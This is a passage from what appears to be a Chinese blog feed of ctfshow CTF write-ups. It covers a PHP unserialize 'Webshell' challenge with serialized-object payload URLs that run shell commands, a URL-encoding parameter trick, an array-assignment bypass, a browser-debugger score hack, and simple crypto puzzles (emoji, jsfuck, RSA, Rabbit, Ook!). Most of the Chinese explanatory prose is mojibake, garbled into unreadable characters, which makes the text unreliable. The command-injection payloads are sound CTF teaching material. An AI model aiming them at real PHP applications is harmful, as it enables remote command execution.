single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$unserializecmd</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª£Á†ÅÁöÑÊÑèÊÄùÊòØÂÆö‰πâ‰∫Ü‰∏Ä‰∏™webshellÁ±ªÔºåÈáåÈù¢ÂåÖÂê´‰∏Ä‰∏™ÂÖ¨ÂÖ±Â±ûÊÄßÔºà<strong>cmd</strong>ÔºâÂíå‰∏â‰∏™ÂÖ¨ÂÖ±ÊñπÊ≥ïÔºà**_construct()Ôºåinit()Ôºåexec()<strong>ÔºâÂÖ∂‰∏≠init()ÊñπÊ≥ïÂú®ÊûÑÈÄ†ÂáΩÊï∞_construct()‰∏≠Ë¢´Ë∞ÉÁî®ÔºåÁõÆÁöÑÊòØÁî®Êù•Ê£ÄÊü•cmdÂÄº‰∏≠ÊòØÂê¶Âê´ÊúâÂèÇÊï∞</strong>flag<strong>Â¶ÇÊûúÂê´ÊúâÔºåÂàôËæìÂá∫</strong>Hello World!<strong>ÔºåÂèç‰πãÔºåÂàôË∞ÉÁî®exec()ÊñπÊ≥ïÊù•ÊâßË°å</strong>$cmd**„ÄÇ<br><img src="https://img-blog.csdnimg.cn/b09519fa51e74250a34f9e317b3884ce.png" alt="1"><br>ÂÖ∑‰ΩìÊù•ËØ¥ÔºåÂèØ‰ª•ÊâßË°åÂ¶Ç‰∏ãÁöÑ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$W</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$W</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> ÂæóÂà∞<strong>O:8:‚ÄùWebshell‚Äù:1:{s:3:‚Äùcmd‚Äù;s:2:‚Äùls‚Äù;}</strong></p><blockquote><p>Ëøô‰∏™Â≠óÁ¨¶‰∏≤Ë°®Á§∫‰∏Ä‰∏™ÂåÖÂê´‰∏Ä‰∏™Âêç‰∏∫ cmd ÁöÑÂ±ûÊÄßÁöÑ Webshell Á±ªÂØπË±°„ÄÇs:3:‚Äùcmd‚Äù Ë°®Á§∫Â±ûÊÄßÂêçÂ≠óÁöÑÈïøÂ∫¶‰∏∫ 3Ôºås:2:‚Äùls‚Äù Ë°®Á§∫ $cmd Â±ûÊÄßÁöÑÂÄº‰∏∫ ‚Äúls‚ÄùÔºåÂÆÉÁöÑÈïøÂ∫¶‰∏∫ 2„ÄÇÈÄöËøáÂ∞ÜËøô‰∏™Â≠óÁ¨¶‰∏≤‰º†ÈÄíÁªô unserialize() ÂáΩÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÂÖ∂ÂèçÂ∫èÂàóÂåñ‰∏∫‰∏Ä‰∏™ Webshell ÂØπË±°ÔºåÂπ∂ÊâßË°åÂÖ∂‰∏≠ÂåÖÂê´ÁöÑÂëΩ‰ª§„ÄÇ</p></blockquote><p>urlÔºö<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4cc0a2e1e93546adba733d88ea1641e3.png" alt="3"><br>urlÔºö<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;tac fl*&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4df37ceb5f164c95b99945642caeb496.png" alt="2"></p><h2 id="ÂåñÈõ∂‰∏∫Êï¥"><a href="#ÂåñÈõ∂‰∏∫Êï¥" class="headerlink" title="ÂåñÈõ∂‰∏∫Êï¥"></a>ÂåñÈõ∂‰∏∫Êï¥</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Â§™Èïø‰∫ÜÔºÅÔºÅ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span><span class="token string double-quoted-string">"Â§ßÁâõ"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>count()Áî®Êù•ÁªüËÆ°get‰º†ÂÖ•ÂèÇÊï∞ÁöÑ‰∏™Êï∞ÔºåÂ¶ÇÊûú‰º†ÂÖ•**?a&#x3D;1<strong>ÔºåÈÇ£Â∞±ÊòØ‰∏Ä‰∏™ÂèÇÊï∞Ôºå‰º†ÂÖ•</strong>?a&#x3D;1&amp;b&#x3D;2<strong>ÔºåÈÇ£Â∞±ÊòØ‰∏§‰∏™ÂèÇÊï∞„ÄÇ<br>strlen()Áî®Êù•ËøîÂõûÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶ÔºåÂ¶ÇÊûúÂ§ß‰∫é1ÔºåÈÇ£Â∞±ÊâßË°ådieÔºåÂê¶ÂàôÂ∞Ü‰º†ÂÖ•ÁöÑgetÂèÇÊï∞ÊãºÊé•Âà∞result‰∏≠„ÄÇ<br>ÁÑ∂ÂêéÂ¶ÇÊûúresult&#x3D;&#x3D;&#x3D;Â§ßÁâõÔºåÈÇ£Â∞±ËæìÂá∫flag„ÄÇ<br><strong>Âú®ËøôÈáåÊàë‰ª¨ÈúÄË¶ÅÁü•ÈÅì</strong><br><code>Â§ßÁâõ</code>Âú®urlÁºñÁ†ÅÂêéÊòØ<code>%E5%A4%A7%E7%89%9B</code>‰∏Ä‰∏™%E5Âç†Áî®‰∏Ä‰∏™Â≠óËäÇÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂ∞Ü</strong>Â§ßÁâõ<strong>ËøõË°åurlÁºñÁ†ÅÁÑ∂Âêé</strong>forÂáΩÊï∞**ËøõË°åÊãºÊé•ÂæóÂà∞flag„ÄÇ‰∏Ä‰∏™Ê±âÂ≠óÊúâ3‰ΩçurlÁºñÁ†ÅÔºåÁÑ∂ÂêéÁî®1-6</p><p>payload<code>http://da499d91-835d-4543-9c2e-faa0b2ea3723.challenge.ctf.show?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>‰πãÂêéÂæóÂà∞flag„ÄÇ</p><h2 id="Êó†‰∏ÄÂπ∏ÂÖç"><a href="#Êó†‰∏ÄÂπ∏ÂÖç" class="headerlink" title="Êó†‰∏ÄÂπ∏ÂÖç"></a>Êó†‰∏ÄÂπ∏ÂÖç</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëøô‰∏™È¢òÁöÑÊÑè‰πâÊòØÂï•Âë¢Ôºü<br>ÊàëÂ∞±payload<code>?0=1</code>ÔºåflagÂ∞±Âá∫Êù•‰∫Ü„ÄÇ</p><h2 id="‰º†ËØ¥‰πã‰∏ãÔºàÈõæÔºâ"><a href="#‰º†ËØ¥‰πã‰∏ãÔºàÈõæÔºâ" class="headerlink" title="‰º†ËØ¥‰πã‰∏ãÔºàÈõæÔºâ"></a>‰º†ËØ¥‰πã‰∏ãÔºàÈõæÔºâ</h2><p><img src="https://img-blog.csdnimg.cn/86faa25095144eb18cf9de64afbcc1da.png" alt="1">Ê∏∏ÊàèÁïåÈù¢ÔºåÈÇ£Â∞±Êâæ‰∏Ä‰∏ãjs‰ª£Á†Å„ÄÇ<br><img src="https://img-blog.csdnimg.cn/71650c9a07134eb5b6c38dbbc521594f.png" alt="1"><br>‰ªñËØ¥ÂàÜÊï∞ËææÂà∞2077ÂêéÂ∞±Áªôflag„ÄÇÂú®ÂâçÁ´ØÊîπ‰∏Ä‰∏ãËØïËØïÔºå<br><img src="https://img-blog.csdnimg.cn/b6106be08f764e75a1e4894ec5956cf4.png" alt="1"><br>ÂèëÁé∞‰∏çË°å„ÄÇÂÜçÂ•ΩÂ•ΩÊâæ‰∏Ä‰∏ãÔºåÂú®jsÊñá‰ª∂‰∏≠ÊêúÁ¥¢score„ÄÇÊâæÂà∞ÂÖ≥ÈîÆÁÇπ<br><img src="https://img-blog.csdnimg.cn/8fb09945e91f47979007d09792c3f4d9.png" alt="2"><br>ÂèàÂ≠¶Âà∞‰∫Ü‰∏Ä‰∏™ÔºåÂú®Ê≠§Â§Ñ‰∏ãÊñ≠ÁÇπÔºàÁÇπÂáª275Âç≥ÂèØÔºâÔºå<br><img src="https://img-blog.csdnimg.cn/5e5a7f6f549649f78e132f1eea8d43e9.png" alt="3"><br>ÁÑ∂ÂêéÂºÄÂßãÊ∏∏ÊàèÁ≠âÂà∞ÂêÉ‰∫Ü‰∏Ä‰∏™ËãπÊûúÁöÑÊó∂ÂÄôÔºåÁ®ãÂ∫è‰ºöÂú®Êñ≠ÁÇπÂÅú‰∏ãÔºå<br><img src="https://img-blog.csdnimg.cn/f4ee69e852294ad4a6759ec9dc942294.png" alt="4"><br>Âú®ÊéßÂà∂Âè∞ËæìÂÖ•<code>var nowScore = this.score += 2078</code>ÂõûËΩ¶Ôºå<br><img src="https://img-blog.csdnimg.cn/e683ba59ae094d319d18982091228622.png" alt="5"><br>ÁÑ∂ÂêéÁªßÁª≠Ê∏∏Êàè<br><img src="https://img-blog.csdnimg.cn/6574abd9ddaa4ac6888479fdb6939508.png" alt="6"><br>ÂæóÂà∞flag„ÄÇ</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h2><p>üò´üôÑüë∞üò∞üë£üôãüò±üëßüëåüë∑üëØüë©üò¥üëñüë´üëöüôÉüëπüëèüëèüò∂üë≥üò´üëïüôÇüôäüëµüë∂üë®üë∞üëÆüôâüë∂üëµüë∏üë≤üë∫üëÆüëëüò∂üë¥üò´üôäüë´üò¥üë¨üëπüë§üëëüò±üëóüôÉüëêüò∂</p><p><strong>ÊèêÁ§∫Ôºö ÊúâÊ≤°Êúâ‰∏ÄÁßçÂèØËÉΩÔºåÊ†áÈ¢òÂ∞±ÊòØÂØÜÁ†ÅÔºü</strong><br>ËØï‰∫Ü‰∏Ä‰∏ãbase100Ëß£ÂØÜÔºå‰∏çË°å„ÄÇÈÇ£Â∞±ÊòØ<a href="https://txtmoji.com/">emojisËß£ÂØÜ</a>ÔºåÈúÄË¶ÅÂØÜÁ†ÅÔºåÁúãÈ¢òÁõÆÔºå0x‰ª£Ë°®ÂçÅÂÖ≠ËøõÂà∂Ëß£ÂØÜ36dÂæóÂà∞<strong>877</strong>ÔºåÊàêÂäüÂæóÂà∞flag„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-Crypto</title>
      <link href="/2023/02/26/ctfshow-Crypto/"/>
      <url>/2023/02/26/ctfshow-Crypto/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="jsfuckÂä†ÂØÜ"><a href="#jsfuckÂä†ÂØÜ" class="headerlink" title="jsfuckÂä†ÂØÜ"></a>jsfuckÂä†ÂØÜ</h2><p><strong>jsfuckÂä†ÂØÜ</strong><br>ÊâìÂºÄÊéßÂà∂Âè∞ÔºåÂ§çÂà∂Á≤òË¥¥ÂõûËΩ¶ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/9bf0f33ceb1f4c35a6b09386746ae59c.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/687b19df85a746f58df6d8da3f836637.png" alt="2"></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>‰∏ãËΩΩÂêéÁî®ËÆ∞‰∫ãÊú¨ÊâìÂºÄÔºåÂ§çÂà∂Á≤òË¥¥Âà∞ÊéßÂà∂Âè∞„ÄÇÂæóÂà∞flag„ÄÇ</p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p><strong>Â∑≤Áü• p q e Ê±Ç d</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">447685307</span>q <span class="token operator">=</span> <span class="token number">2037</span>e <span class="token operator">=</span> <span class="token number">17</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/64725cd54d814229a18167911ca6c9d6.png" alt="3"></p><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p><img src="https://img-blog.csdnimg.cn/ae3ca93b1ac246b097cc59ba826eb835.png" alt="5"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Â∑≤Áü•(p, q, e,c)ÔºåÊ±Çm„ÄÇ</span><span class="token keyword">import</span> gmpy2p<span class="token operator">=</span><span class="token number">447685307</span>q<span class="token operator">=</span><span class="token number">2037</span>e<span class="token operator">=</span><span class="token number">17</span>c<span class="token operator">=</span><span class="token number">704796792</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rabbitËß£ÂØÜ"><a href="#rabbitËß£ÂØÜ" class="headerlink" title="rabbitËß£ÂØÜ"></a>rabbitËß£ÂØÜ</h2><p><img src="https://img-blog.csdnimg.cn/e94a5d5a735d43d880be0981bebbbbdc.png" alt="6"></p><p><a href="http://www.jsons.cn/rabbitencrypt/">rabbitËß£ÂØÜ</a></p><h2 id="ookÂä†ÂØÜ"><a href="#ookÂä†ÂØÜ" class="headerlink" title="ookÂä†ÂØÜ"></a>ookÂä†ÂØÜ</h2><blockquote><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? 